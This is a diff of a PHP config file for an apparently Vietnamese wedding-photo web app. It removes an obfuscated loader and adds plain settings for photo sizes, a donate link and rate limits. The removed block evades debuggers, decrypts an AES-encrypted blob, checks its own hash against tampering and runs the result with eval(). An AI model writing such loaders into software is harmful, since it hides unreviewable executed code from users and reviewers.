@@ -1,28 +1,57 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_bhr5jjie=('bas'.'e64'.'_de'.'cod'.'e');
-$_sssan4k4=('gzu'.'nco'.'mpr'.'ess');
-$_rqw9big4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_lgzuncpm='gw35G93e';
-$_p2dpgda2='x26quQ43dp4=';
-$_f7lxznep='3JGl33DA';
-$_jeg3wez1='9XRc+99M';
-$_lptmce08='jlBMTfQG';
-$_nogvs18j='+qlDYnIK';
-$_z6dc1npn='+POuPnHj';
-$_s3rdokt9='GUxsXA==';
-$_ea3a45iz=$_bhr5jjie($_lptmce08.$_f7lxznep.$_lgzuncpm.$_jeg3wez1.$_p2dpgda2);
-$_skd55i7x=$_bhr5jjie($_z6dc1npn.$_nogvs18j.$_s3rdokt9);
-$_cnx15yy1=$_bhr5jjie('kOO6b1m9wVlP2v21SihUmIb5rrKk6wA8p8hZAzRWtsicoL7HaqQPJuHeNOQ+Xic5U6LSslCFw4oxZV77gqLjoeOpFzlt+LE1HwLGDj4E4kKGUVNDXeLVi+GIwUXNn6kdqJTx63JvYFPJ+WDxXCnTTc3NiEdUzr0MHn8vZcm5L9WQ3dMaR+JXTwXRuWhGIQlfhfADWn6CHNnhqiQPW9zOSFtFxJ4i36JPLM2wJujrNnlylUqTrCYJ6gGcgOBjkKcdmKwprIGoSs6Q+PgoPMTA259JIpAksy0aGMwETxo4ViYV8qW/XeTh+jTIdiQMncrc4iF0U5wRO7L0LVfOH0WtNhb0ZG1LQmDIIQZrn0kbudMIy2EktyajTJn2kyluKPH0nuPqpgVjlBII+aLXTC5cH8Sy8y3Qkf7+Up3nTlC6lyvZcbrt0Xzk6QmnRgiAjnfo3ETo8WYdN9SrHeq+xJI2vACZCR9/PKeSuTUEqq+BS7wPF912RJDm0iT9cRYGu+7g8lUrAH5CbK7Lbkz57QsxeuBiKP8eTG9jIfs6Pamj37KqJaEnBG7evzxLUzE9WbyGdfHaqNkejVMHGbMs11R829JOC0tlFvA2QBkOGv2cWRU=');
-$_x5iezp8d=$_rqw9big4($_cnx15yy1,'aes-256-cbc',$_ea3a45iz,OPENSSL_RAW_DATA,$_skd55i7x);
-if($_x5iezp8d===false){exit;}
-$_dpsl1hm5=$_sssan4k4($_x5iezp8d);
-if($_dpsl1hm5===false){exit;}
-$_fhmiyhso='c7ead48d062153a389ee8308d68ab44c90314756620249a409b2c6baeabce5c0';
-$_qk96bvlc=@file_get_contents(__FILE__);
-if($_qk96bvlc!==false){
-$_huiqmznb=str_replace($_fhmiyhso,"0000000000000000000000000000000000000000000000000000000000000000",$_qk96bvlc);
-$_fp4sx06a=hash("sha256",$_huiqmznb);
-if($_fp4sx06a!==$_fhmiyhso){@http_response_code(403);exit;}
-}
-eval($_dpsl1hm5);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+$config['app_version'] = '0.3.5';
+$config['app_name'] = 'Ảnh Cưới';
+
+
+$config['cloud_base'] = 'https://api.jagame.vn';
+$config['cloud_domain'] = 'jagame.vn';
+
+// Nút "♡ Ủng hộ" trong trang quản trị: DONATE_URL nếu có; chế độ nhiều cặp (có BASE_DOMAIN) thì trang ủng hộ của
+// nền tảng (platform/index.php, /ung-ho); còn lại là trang của tác giả phần mềm gốc.
+$config['donate_url'] = getenv('DONATE_URL') ?: (getenv('BASE_DOMAIN')
+? (getenv('SITE_SCHEME') ?: 'https') . '://' . getenv('BASE_DOMAIN') . (getenv('SITE_PORT') ?: '') . '/ung-ho'
+: 'https://jagame.vn/donate/');
+
+$config['hosted_domain'] = 'thiep.site';
+
+$config['photo_medium_px'] = 2048;
+$config['photo_thumb_px'] = 640;
+$config['photo_jpeg_quality'] = 84;
+$config['photo_allowed_mime'] = array(
+'image/jpeg' => 'jpg',
+'image/png' => 'png',
+'image/webp' => 'webp',
+'image/gif' => 'gif',
+);
+
+$config['photo_owner_max_mb'] = 60;
+
+$config['photo_owner_max_mp'] = 120;
+$config['photo_guest_max_mp'] = 32; 
+
+
+
+
+// Giới hạn: array(số lần, cửa sổ giây, số lần mỗi IP | NULL, số lần chung mọi người | NULL).
+// Khi phần tử thứ 3 là NULL, số đầu là giới hạn mỗi IP. IPv6 được gộp theo dải /64 (xem Ratelimit::ip_bucket).
+// Phần tử thứ 4 là trần chung: chặn kẻ đổi IP liên tục (đoán mật khẩu, làm đầy ổ đĩa).
+$config['rl_login'] = array(10, 900, NULL, 100);
+$config['rl_wish'] = array(10, 3600, 200);
+$config['rl_rsvp'] = array(5, 3600, 200);
+$config['rl_album_password'] = array(15, 900, 30, 300);
+$config['rl_guest_upload'] = array(300, 3600, 1000, 3000);
+
+
+$config['rl_slug_miss'] = array(30, 600, 300, 2000);
+
+// Ảnh khách: luôn chừa lại ít nhất chừng này MB trống trên ổ, và tối đa chừng này ảnh chờ duyệt.
+$config['guest_min_free_mb'] = 2048;
+$config['guest_max_pending'] = 2000;
+
+$config['rl_rsvp_invite'] = array(10, 3600, 200);
+
+$config['rl_zip'] = array(6, 3600, 60);
